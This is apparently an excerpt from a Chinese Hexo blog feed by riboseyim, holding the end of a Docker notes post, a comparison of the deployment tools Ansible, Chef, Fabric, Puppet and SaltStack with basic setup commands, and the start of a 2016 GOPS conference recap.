<li>登录<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">Login with your Docker ID to push and pull images from Docker Hub.</span><br><span class="line">If you don\<span class="string">&#x27;t have a Docker ID, head over to https://hub.docker.com to create one.</span></span><br><span class="line"><span class="string">Username: riboseyim</span></span><br><span class="line"><span class="string">Password:</span></span><br><span class="line"><span class="string">Login Succeeded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 为本地的 image 标注用户名和版本。</span></span><br><span class="line"><span class="string">$ docker image tag [imageName] [username]/[repository]:[tag]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 发布</span></span><br><span class="line"><span class="string">$ docker image push riboseyim/gospider</span></span><br><span class="line"><span class="string">The push refers to repository [docker.io/riboseyim/gospider]</span></span><br><span class="line"><span class="string">db602e58edca: Pushed</span></span><br><span class="line"><span class="string">c5b2ac536264: Mounted from library/node</span></span><br><span class="line"><span class="string">6c08a5b7d8f4: Mounted from library/node</span></span><br><span class="line"><span class="string">50867bb8f5d7: Mounted from library/node</span></span><br><span class="line"><span class="string">72d6c6f0ea06: Mounted from library/node</span></span><br><span class="line"><span class="string">8686c6b8d999: Mounted from library/node</span></span><br><span class="line"><span class="string">44b57351135e: Mounted from library/node</span></span><br><span class="line"><span class="string">00b029f9aa09: Mounted from library/node</span></span><br><span class="line"><span class="string">18f9b4e2e1bc: Mounted from library/node</span></span><br><span class="line"><span class="string">latest: digest: sha256:4388ba2cc83adc0d1e9b3ca4c0b273f5812ad6365a36aeef33ff87d62b236d5d size: 2217</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Docker-构建"><a href="#Docker-构建" class="headerlink" title="Docker 构建"></a>Docker 构建</h4><ul>
<li><a href="https://github.com/openshift/source-to-image">A tool for building/building artifacts from source and injecting into docker images</a></li>
</ul>
<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><ul>
<li><a href="https://blog.hasura.io/the-ultimate-guide-to-writing-dockerfiles-for-go-web-apps-336efad7012c">The Ultimate Guide to Writing Dockerfiles for Go Web-apps</a></li>
</ul>
<h2 id="Docker-安全"><a href="#Docker-安全" class="headerlink" title="Docker 安全"></a>Docker 安全</h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security:Linux容器安全的十重境界</a><br>1.容器操作系统与多租户<br>2.容器内容（使用可信源）<br>3.容器注册 (容器镜像加密访问)<br>4.构建过程安全<br>5.控制集群中可部署的内容<br>6.容器编排：加强容器平台安全<br>7.网络隔离<br>8.存储<br>9.API 管理, 终端安全和单点登录 (SSO)<br>10.角色和访问控制管理</li>
</ul>
<h2 id="Docker-网络"><a href="#Docker-网络" class="headerlink" title="Docker 网络"></a>Docker 网络</h2><ul>
<li><a href="http://cizixs.com/2017/10/19/docker-calico-network">docker 容器网络方案：calico 网络模型 | Cizixs</a></li>
</ul>
<h2 id="Docker-监控"><a href="#Docker-监控" class="headerlink" title="Docker 监控"></a>Docker 监控</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650993402&amp;idx=2&amp;sn=39583a788d89d62ecb4953d4a9f8635a&amp;scene=1&amp;srcid=0722P3T1gARgmDlPwn8ZDNr9%23rd">搭建Docker监控框架的理论与范例 | 2016-07-22 穆寰 InfoQ</a></li>
</ul>
<h2 id="Docker-参考书"><a href="#Docker-参考书" class="headerlink" title="Docker 参考书"></a>Docker 参考书</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">Docker 入门教程</a></li>
<li><a href="https://www.yuque.com/grasilife/docker">Docker — 从入门到实践</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.linuxtechi.com/guide-docker-utilities-daemon-capabilities/">Quick Guide on Docker Utilities, Daemon and its other capabilities</a></li>
<li><a href="https://linux4one.com/how-to-remove-docker-images-networks-containers-and-volumes/">How to Remove Docker Images, Networks, Containers and Volumes</a></li>
<li><a href="https://medium.freecodecamp.org/docker-quick-start-video-tutorials-1dfc575522a0">A fast and easy Docker tutorial for beginners (video series)</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html">Docker 微服务教程</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5ODQ2MDIyMA==&amp;mid=2650712620&amp;idx=1&amp;sn=39b33e0f1dfc335e165051b2983f9192&amp;scene=1&amp;srcid=0906ZUDNyflKkccX0TptpfJM%23rd">在 Mac 上跳舞的容器 — Docker |  2016-09-06 池建强 MacTalk</a></li>
<li><a href="https://agentneoteam.github.io/2018/05/07/agentneo-jia-gou-jian-jie.html">AgentNEO 架构简介 | 07 May 2018</a></li>
<li><a href="https://developers.redhat.com/blog/2018/02/22/container-terminology-practical-introduction/">A Practical Introduction to Container Terminology</a></li>
<li><a href="http://sirupsen.com/production-docker/">Why Docker is Not Yet Succeeding Widely in Production,2015 | Simon Hørup Eskildsen </a></li>
<li><a href="https://www.youtube.com/watch?v=ZDeAEZHby_A">Dockercon Talk | Resilient Routing and Discovery | Simon Hørup Eskildsen </a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=2653548247&amp;idx=1&amp;sn=99d0e90fa99deec3a7dab49eac418e5c&amp;chksm=813a7f4fb64df65946223f717a5231aae62edc5b6335613e45f8153367736ed480e9439d8906&amp;mpshare=1&amp;scene=1&amp;srcid=0215WY6P1gGeSGjrVAD75iaB%23rd">数据库不适合Docker及容器化的7大原因 | 2017-02-14 Mikhail Chinkov 高可用架构</a></li>
<li><a href="https://chrisshort.net/docker-inc-is-dead/">Docker, Inc is Dead | Posted on December 30, 2017  (Last modified on February 9, 2018)</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MzM3NjM4MA==&amp;mid=2654676719&amp;idx=2&amp;sn=5d3e73befafe752d6e84788dcb6b33ec&amp;scene=1&amp;srcid=0622QOd24IK0rdOypNUq1BcA%23rd">关于Docker实际采用情况的八个惊人真相 | 2016-06-22 云头条</a></li>
<li><a href="https://cloudplatform.googleblog.com/2018/05/Open-sourcing-gVisor-a-sandboxed-container-runtime.html">Open-sourcing gVisor, a sandboxed container runtime | Wednesday, May 2, 2018</a></li>
<li><a href="https://developers.redhat.com/blog/2018/02/22/container-terminology-practical-introduction/">A Practical Introduction to Container Terminology</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：基础设施部署和配置管理</title>
    <url>/2018/03/26/DevOps-Deployment/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack</li>
</ul>
<span id="more"></span>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Deploying-Management-Tools.png" alt=""></p>
<p>在生产环境中工作，常常意味着连续部署和遍布全球的基础设施。如果您的基础架构是分散式和基于云的，同时您需要在大量服务器上频繁部署大量类似的服务，如果此时有一种方法可以自动配置和维护以上所有内容将是您的一大福音。</p>
<p>部署管理工具（Deployment management tools）和配置管理工具(configuration management tools)是为此目的而设计的。它们使您能够使用“食谱”（recipes），“剧本” (playbooks)，模板(templates)或任何术语来简化整个环境中的自动化和编排，以提供标准、一致的部署。</p>
<p>在选择工具时请记住几点注意事项。首先是了解工具的模型。有些工具采用主控模式（master-client model），它有一个集中控制点（master）与分布式部署的服务器进行通信，其他部分则可以在更本地的层面上运行。另一个考虑因素是你的环境构成。有些工具是采用不同的语言编写的，对于特定的操作系统或设置可能会有所不同。确保您选择的工具与您的环境完美配合，充分利用团队的特定技能可以为您节省很多麻烦。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>项目</th>
<th>开发语言</th>
<th>部署模型</th>
<th>适用场景</th>
<th>注意事项</th>
<th>付费</th>
<th>结论</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ansible</td>
<td>Python</td>
<td>push model,agentless</td>
<td>ssh-based <br> nodes&lt;1000</td>
<td>Linux [ ok ] <br> Mac [hard] <br> Windows [hard]</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td><a href="https://riboseyim.github.io/2018/09/18/DevOps-Deployment-SaltStack">SaltStack</a></td>
<td>Python</td>
<td>master-client,zeromq</td>
<td>ssh &amp; push <br> 高性能</td>
<td>Linux [ ok ] <br> Mac [only salt-minion] <br> Windows [ ok ] 学习曲线陡峭</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>Chef</td>
<td>Ruby</td>
<td>master-client</td>
<td>git-based <br> development-focused</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td><a href="https://riboseyim.github.io/2018/09/17/DevOps-Deployment-Puppet/">Puppet</a></td>
<td>Ruby</td>
<td>master-client,model-driven</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>Fabric</td>
<td>Python</td>
<td>——-</td>
<td>ssh-based</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
</tbody>
</table>
</div>
<h4 id="1-Ansible"><a href="#1-Ansible" class="headerlink" title="1. Ansible"></a>1. Ansible</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Ansible-Logo.jpg" alt=""><br>￼Ansible是一种开源工具，用于以可重复的方式将应用程序部署到远程节点和配置服务器。它为您提供了基于推送模型（push model ）推送多层应用程序和应用程序组件的通用框架，您也可以根据需要将其设置为 master-client 模式。 Ansible 建立在可用于各种系统上部署应用程序的剧本(playbook)。</p>
<p><strong>何时使用它</strong> ：对您来说最重要的是快速，轻松地启动和运行，并且您不想在远程节点或受管服务器上安装代理（Agent）。如果您的需求重点更多地放在系统管理员身上，专注于精简和快速，请考虑 Ansible 。</p>
<p>价格：免费的开源版本，Ansible Tower 的付费套餐每年 5000 美元（最多可容纳100个节点）。</p>
<p><strong>赞成的理由：</strong></p>
<ul>
<li>基于 SSH , 不需要在远程节点安装任何代理</li>
<li>学习曲线平缓、使用 YAML</li>
<li>Playbook 结构简单，结构清晰</li>
<li>具有变量注册功能，可以使前一个任务作为后一个任务的变量</li>
<li>代码库精简</li>
</ul>
<p><strong>反对的理由：</strong></p>
<ul>
<li>相较其他编程语言的工具功能有限。</li>
<li>通过 DSL 实现其逻辑，这意味着需要经常查看文档直到您学会为止</li>
<li>即使是最基本功能也需要变量注册，这可能使简单任务变得复杂</li>
<li>内省（Introspection）很差。例如很难在剧本中看到变量的值</li>
<li>输入，输出和配置文件格式之间缺乏一致性</li>
<li>性能存在一定瓶颈</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ansible-Tower-Dashboard.png" alt=""></p>
<ul>
<li><a href="https://www.howtoforge.com/ansible-guide-create-ansible-playbook-for-lemp-stack/">Ansible Guide: Create Ansible Playbook for LEMP Stack</a></li>
</ul>
<h4 id="2-Chef"><a href="#2-Chef" class="headerlink" title="2. Chef"></a>2. Chef</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Chef-Logo.jpg" alt=""><br>￼Chef 是一个配置管理开源工具，用户群专注面向开发者。Chef 作为 master-client  模式运行，需要一个单独的工作站来控制 master 。Chef 基于 Ruby 开发，纯 Ruby 可以支持大多数元素。Chef 的设计是透明的，并遵循给定的指示，这意味着你必须确保你的指示是清楚的。</p>
<p>何时使用它：在考虑 Chef 之前，需要确保你熟悉 Git ，因为它需要配置 Git ，你必须编写 Ruby 代码。Chef 适合以开发为中心（development-focused ）的团队和环境。对于寻求更成熟异构环境解决方案的企业来说，这是一件好事。</p>
<p>价格：提供免费的开源版本，标准版和高级版计划以每年节点为单位定价。 Chef Automate 的价格为每个节点 137 美元，或者采用 Hosted Chef 每个节点每年节省72 美元。</p>
<p><strong>赞成的理由：</strong></p>
<ul>
<li>丰富的模块和配置配方(recipes)</li>
<li>代码驱动的方法为您提供更多的配置控制和灵活性</li>
<li>以 Git 为中心赋予 Chef 强大的版本控制功能</li>
<li>‘Knife’工具（使用 SSH 从工作站部署代理）减轻了安装负担</li>
</ul>
<p><strong>反对的理由：</strong></p>
<ul>
<li>如果您还不熟悉 Ruby 和面向过程编程，学习曲线会非常陡峭</li>
<li>这不是一个简单的工具，可能需要维护大量的代码库和复杂的环境</li>
<li>不支持推送功能</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Chef-Compliance-Node.png" alt=""></p>
<h4 id="3-Fabric"><a href="#3-Fabric" class="headerlink" title="3. Fabric"></a>3. Fabric</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Fabric-Logo.jpg" alt=""><br>Fabric 是一个基于 Python 的应用程序部署工具。Fabric 的主要用途是在多个远程系统上运行任务，但它也可以通过插件的方式进行扩展，以提供更高级的功能。 Fabric 将配置您的操作系统，进行操作系统/服务器管理，自动化部署您的应用。<br>￼<br>何时使用它：如果您刚刚开始进入部署自动化领域，Fabric 是一个良好的开端。如果您的环境至少包含一点 Python，它都会有所帮助。</p>
<p>价格：免费</p>
<p><strong>赞成的理由：</strong></p>
<ul>
<li>擅长部署以任何语言编写的应用程序。它不依赖于系统架构，而是依赖于操作系统和软件包管理器</li>
<li>相比其他工具更简单，更易于部署</li>
<li>与 SSH 进行了广泛的整合，以实现基于脚本的流水线</li>
</ul>
<p><strong>反对的理由：</strong></p>
<ul>
<li>Fabric 是单点设置（通常是运行部署的机器）</li>
<li>使用 PUSH 模型，因此不如其他工具那样适合流水线部署模型</li>
<li>虽然它是用于在大多数语言中部署应用程序的绝佳工具，但它确实需要运行Python，所以您的环境中必须至少有一个适用于 Fabric 的 Python 环境</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Fabric-Dashboard-1024x823.png" alt=""></p>
<h4 id="4-Puppet"><a href="#4-Puppet" class="headerlink" title="4. Puppet"></a>4. Puppet</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Puppet-Logo.png" alt=""><br>￼Puppet 长期依赖是全面配置管理领域的标准工具之一。Puppet 是一个开源工具，但是考虑到它已经存在了多长时间，它已经在一些最大和最苛刻的环境中进行了部署和验证。 Puppet 基于 Ruby 开发，但使用更接近 JSON 的领域专用语言（Domain Specific Language，DSL）。Puppet 采用master-client 模式运行，并采用模型驱动(model-driven)的方法。 Puppet 将工作设计为一系列依赖关系列表，根据您的设置，这可以使事情变得更容易或更容易混淆。</p>
<p><strong>何时使用它：</strong> 如果稳定性和成熟度对您来说是最关键的因素，Puppet 是一个不错的选择。对于具有异构环境的大型企业和涉及多种技能范围的 DevOps 团队而言而言，这是一件好事。</p>
<p>价格：Puppet 分为免费的开源版本和付费的企业版本，商业版每年每个节点 120 美元（提供批量折扣）。</p>
<p><strong>赞成的理由：</strong></p>
<ul>
<li>通过 Puppet Labs 建立了完善的支持社区</li>
<li>具有最成熟的接口，几乎可以在所有操作系统上运行</li>
<li>安装和初始设置简单</li>
<li>最完整的 Web UI</li>
<li>强大的报表功能</li>
</ul>
<p><strong>反对的理由：</strong></p>
<ul>
<li>对于更高级的任务，您需要使用基于 Ruby 的 CLI（这意味着您必须了解Ruby）</li>
<li>纯 Ruby 版本的支持正在缩减（而不是那些使用 Puppet 定制 DSL 的版本）</li>
<li>Puppet 代码库可能会变得庞大，新人需要更多的帮助</li>
<li>与代码驱动方法相比，模型驱动方法意味着用户的控制更少</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Puppet-Dashboard.png" alt=""></p>
<h4 id="5-Saltstack"><a href="#5-Saltstack" class="headerlink" title="5. Saltstack"></a>5. Saltstack</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/SaltStack-Logo.jpg" alt=""></p>
<p>￼SaltStack（或 Salt）是一种基于 CLI 的工具，可以将其设置为 master-client 模型或非集中模型。 Salt 基于Python 开发，提供了 PUSH 和 SSH 两种方法与客户端通讯。 Salt 允许对客户端和配置模板进行分组，以简化对环境的控制。<br><strong>何时使用它：</strong> 如果可扩展性和弹性是一个大问题，则 Salt 是一个不错的选择。对系统管理员来说，Salt 提供的可用性非常重要。</p>
<p>价格：提供免费的开源版本，以及基于年度/节点订阅的 SaltStack Enterprise 版本。具体的价格没有在他们的网站上列出，据说每个节点每年的起步价为 150 美元。</p>
<p><strong>赞成的理由：</strong></p>
<ul>
<li>一旦你渡过了入门阶段，就可以简单地组织和使用</li>
<li>DSL 功能丰富，不需要逻辑和状态</li>
<li>输入，输出和配置非常一致，全部所有 YAML （一个可读性高，用来表达数据序列的格式）</li>
<li>内省(Introspection)非常好。很容易看到 Salt 内部发生了什么</li>
<li>强大的社区</li>
<li>很高的可扩展性和灵活性</li>
</ul>
<p><strong>反对的理由：</strong></p>
<ul>
<li>对于新用户来说，非常难以配置，学习曲线陡峭</li>
<li>在入门级别而言，文档很难理解</li>
<li>Web UI  比同领域的其他工具更新、更轻量</li>
<li>对非 Linux 操作系统没有很好的支持</li>
</ul>
<p><img src="https://docs.saltstack.com/en/getstarted/images/salt-subsystems.png" alt="Salt Subsystems"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SlatStack-Subsystem-Job.png" alt=""></p>
<h4 id="Ansible-vs-Chef-vs-Fabric-vs-Puppet-vs-SaltStack"><a href="#Ansible-vs-Chef-vs-Fabric-vs-Puppet-vs-SaltStack" class="headerlink" title="Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack"></a>Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack</h4><p>您使用的配置管理或部署自动化工具取决于您的环境需求和偏好。 Chef 和 Puppet 是一些较老的、更成熟的选项，它们适用于那些重视成熟性和稳定性而非简单性的大型企业和环境。 Ansible 和 SaltStack 是寻求快速和简约解决方案人士的理想选择，同时在不需要支持某些特殊功能或具有大量操作系统的环境中工作。Fabric 对于小型环境和那些正在寻求更低门槛和入门级解决方案的人来说是一个很好的工具。</p>
<h2 id="SaltStack"><a href="#SaltStack" class="headerlink" title="SaltStack"></a>SaltStack</h2><ul>
<li>Arch:Client/Server</li>
<li>develop language: Python</li>
<li>future: REAL-TIME COMMUNICATION</li>
</ul>
<h4 id="SaltStack-ABC"><a href="#SaltStack-ABC" class="headerlink" title="SaltStack ABC"></a>SaltStack ABC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Install</span></span><br><span class="line">$ brew install saltstack</span><br><span class="line"><span class="comment">## Role:Master</span></span><br><span class="line">$ service salt-master start</span><br><span class="line">$ netstat -ant | grep 450 | grep LISTEN</span><br><span class="line">tcp4       0      0  *.4506                 *.*                    LISTEN     </span><br><span class="line">tcp4       0      0  *.4505                 *.*                    LISTEN</span><br><span class="line"><span class="comment">## Role:Master</span></span><br></pre></td></tr></table></figure>
<h4 id="SaltStack-Resources"><a href="#SaltStack-Resources" class="headerlink" title="SaltStack Resources"></a>SaltStack Resources</h4><ul>
<li><a href="https://github.com/saltstack-formulas">SaltStack Formulas</a></li>
</ul>
<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><ul>
<li>Arch: SSH batch tools</li>
<li>develop language: Python<h4 id="Ansible-ABC"><a href="#Ansible-ABC" class="headerlink" title="Ansible ABC"></a>Ansible ABC</h4></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install</span></span><br><span class="line">$ sudo pip install ansible</span><br><span class="line"><span class="comment"># 默认路径 /etc/ansible/hosts ,参数 -i 指定 hosts 文件</span></span><br><span class="line">$ ansible all -m shell -a <span class="string">&quot;hostname&quot;</span> --ask-pass -i /yourdir/ansible_hosts</span><br><span class="line"><span class="comment"># 或者通过环境变量指定</span></span><br><span class="line">$ <span class="built_in">export</span> ANSIBLE_HOSTS=~/ansible_hosts</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;127.0.0.1&quot;</span> &gt; ~/ansible_hosts</span><br></pre></td></tr></table></figure>
<h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><ul>
<li>Arch: Agent/Server</li>
<li>develop language: Ruby</li>
<li>enterprise &amp; community edition</li>
</ul>
<h4 id="Puppet-ABC"><a href="#Puppet-ABC" class="headerlink" title="Puppet ABC"></a>Puppet ABC</h4><h2 id="WordBook"><a href="#WordBook" class="headerlink" title="WordBook"></a>WordBook</h2><h4 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a><a href="http://yaml.org">YAML</a></h4><p>YAML 语言（发音 /ˈjæməl/ ）实质上是一种通用的数据串行化格式。基本语法规则如下:</p>
<ul>
<li>大小写敏感</li>
<li>使用缩进表示层级关系</li>
<li>缩进时不允许使用Tab键，只允许使用空格。</li>
<li>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可</li>
<li># 表示行注释</li>
</ul>
<p>YAML 支持的数据结构：</p>
<ul>
<li>对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）</li>
<li>数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）</li>
<li><p>纯量（scalars）：单个的、不可再分的值</p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/07/yaml.html">YAML 语言教程</a></p>
</li>
<li><a href="https://www.redhat.com/sysadmin/yaml-tips">10 YAML tips for people who hate YAML</a></li>
</ul>
<h4 id="DSL-Domain-Specific-Language-领域专用语言"><a href="#DSL-Domain-Specific-Language-领域专用语言" class="headerlink" title="DSL|Domain Specific Language,领域专用语言"></a><a href="https://en.wikipedia.org/wiki/Domain-specific_language">DSL|Domain Specific Language,领域专用语言</a></h4><p>DSL的目标受众是非程序员，业务员或者最终用户。<br>DSL 最大的设计原则就是简单，通过简化语言中的元素，降低使用者的负担；无论是 Regex、SQL 还是 HTML 以及 CSS，其说明文档往往只有几页，非常易于学习和掌握。但是，由此带来的问题就是，DSL 中缺乏抽象的概念，比如：模块化、变量以及方法等。</p>
<ul>
<li><a href="http://www.infoq.com/cn/articles/dsl-discussion">领域专用语言(DSL)迷思</a></li>
<li><a href="http://www.infoq.com/cn/articles/dsl-discussion">谈谈 DSL 以及 DSL 的应用（以 CocoaPods 为例）</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.takipi.com/deployment-management-tools-chef-vs-puppet-vs-ansible-vs-saltstack-vs-fabric/">Deployment Management Tools: Chef vs. Puppet vs. Ansible vs. SaltStack vs. Fabric</a></li>
<li><a href="https://www.zhihu.com/question/22707761">SaltStack 与 Ansible 选择？| zhihu.com</a></li>
<li><a href="http://www.saltstack.cn">中国SaltStack用户组|China SaltStack User Group</a></li>
<li><a href="http://www.saltstack.cn/kb/managing-firewall-with-salt/#managing-firewall-with-salt">基于Salt管理iptables防火墙规则</a></li>
<li><a href="https://linux.cn/article-4215-1.html#3_875">Ansible ：一个配置管理和IT自动化工具</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/opensource/os-devops-saltstack-in-cloud/index.html">自动化运维工具 SaltStack 在云计算环境中的实践</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>技术社群：高效运维(GOPS)</title>
    <url>/2016/09/24/DevOps-GOPS/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>2016 GOPS 上海站简报</li>
<li>扩展阅读：工程师的自我修养之全英文技术学习实践</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GOPS_201609_Chris.png" alt=""></p>
<span id="more"></span>
<h2 id="一、2016-GOPS-上海站简报"><a href="#一、2016-GOPS-上海站简报" class="headerlink" title="一、2016 GOPS 上海站简报"></a>一、2016 GOPS 上海站简报</h2><h4 id="1-1-风向：从概念到落地"><a href="#1-1-风向：从概念到落地" class="headerlink" title="1.1 风向：从概念到落地"></a>1.1 风向：从概念到落地</h4><p>延续这两年的风向，云计算、大数据、DevOps、容器等依然是比较热闹的话题。<br>鉴于这些关键词已经比较普及，大家聊的内容开始更多地聚焦在落地应用上。比如关于OpenStack，有人从网络架构角度聊，也有人从数据中心、对象存储、可视化等方面聊。借用李明宇的一句话：“OpenStack是一个生态”，很多公司已经在利用其庞大生态的细分技术来创业了。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GOPS_201609_Li.png" alt=""></p>
<p>从行业分布来看，除了“传统的”几家巨头互联网公司，GOPS大会已经出现了越来越多的传统企业面孔，可能是上海金融中心的背景，银行、保险公司、银联等金融属性的企业参会的很多，此外中移动、石油系、旅游、快递业也很活跃，还办了中小企业专场。</p>
<p>最后，无论是现场交流环节的观众提问，还是我自己的体会，对于大部分人来说，最难的可能还是选型困境：技术方案不是太少，而是选择太多了。以分布式服务为例，有人推崇Zookeeper，有人选择etcd。前者有JAVA派的支持，后者也不乏Go粉的拥趸，或者有的时候就是拍脑袋决策呢？反正各有各的说法，根本也没个标准。希望以后哪位大牛可以来分享下《技术选型指南》。</p>
<h4 id="1-2-特色：Google-SRE-分享"><a href="#1-2-特色：Google-SRE-分享" class="headerlink" title="1.2 特色：Google SRE 分享"></a>1.2 特色：Google SRE 分享</h4><p>本人最感兴趣的是来自Google SRE的分享。</p>
<p>《Google SRE》一书的作者Chris Jones，主要是介绍了一些方法论方面的东西。看气质不像工程师，倒很有几分大学教授的味道。看过《Google SRE》几位作者的简历，除了工程师这个副业，还在斯坦福搞过什么经济学、国际关系、药学博士、文学、诗歌……，Jones则持有Computer Engineering,Economics,Technology Policy三个学位，长期在工程一线，还有professional engineer认证。这哥们还算是它们中间最接近工程师的啦。</p>
<p>Minghua Ye：印象比较深的是推荐了一堆开源库，command-line flags、google protocol buffer、Logging、Googletest…….也许这就是Google人的套路，每当谈到一个什么问题，要么是XXX发表了论文《XXXX》里有说明，要么就是我们发明了XXX技术／工具作为解决方案，开源代码的地址是：XXXX。</p>
<p>孙宇聪：他是《Google SRE》的 中文版译者，前Google SRE。最大的特点就是自带笑点，看得出活得很欢乐、发自内心的。活动现场很多国内企业的CTO、总监 可是极度缺乏这种欢乐。结合zookeeper，讨论了分布式系统的“太祖长拳”——共识系统的一些故事。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/GOPS_201609_Sun.png" alt=""></p>
<h4 id="1-3-终极命题：人才"><a href="#1-3-终极命题：人才" class="headerlink" title="1.3 终极命题：人才"></a>1.3 终极命题：人才</h4><p>大多数人可能并没有注意到，本次活动还有一个主题：人才。<br>在热闹的开幕会场上，宣布了三件事：</p>
<p>1.“不出所料”，萧帮主终于从原企业离职，全职搞社区创业去了。<br>2.社区和复旦大学合作，推出了联合培养软件工程硕士的项目。<br>3.社区和EXIN合作，试水DevOps Master认证培训。</p>
